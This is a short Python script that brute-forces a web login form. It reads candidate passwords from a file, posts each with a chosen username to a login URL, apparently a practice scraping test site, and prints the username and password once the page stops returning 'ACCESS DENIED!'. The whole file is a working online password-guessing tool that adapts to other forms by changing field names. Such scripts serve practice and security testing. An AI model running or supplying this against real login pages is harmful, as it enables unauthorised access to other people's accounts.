import requests


def bruteforce(username,url):
    passlist=passwords.strip('\n').split('\n')
    for password in passlist:
        print("[!!] brute forcing with "+password)
        # data_dictionary={"username":username,"password":password,"Login":"submit"}
        data_dictionary={"usr":username,"pwd":password,"submit":"submit"}
        # dd={"usr":"admin","pwd":12345,"submit":"submit"}
        
        
        response=requests.post(url,data=data_dictionary)
        # response=requests.post(url,data=dd)
        print(response.content.decode())
        
        # print(response.content.decode())
        if "ACCESS DENIED!" in response.content.decode():
            pass
        else:
            print("[+] the username is :"+username)
            print("[+] The password is :"+password)
            exit()

            





page_url="http://testing-ground.scraping.pro/login"
username=input("Enter the username for the specified page:")

with open('passwords.txt','r') as file:
    passwords=file.read()
    bruteforce(username,page_url)

print("[!!] password not in this list")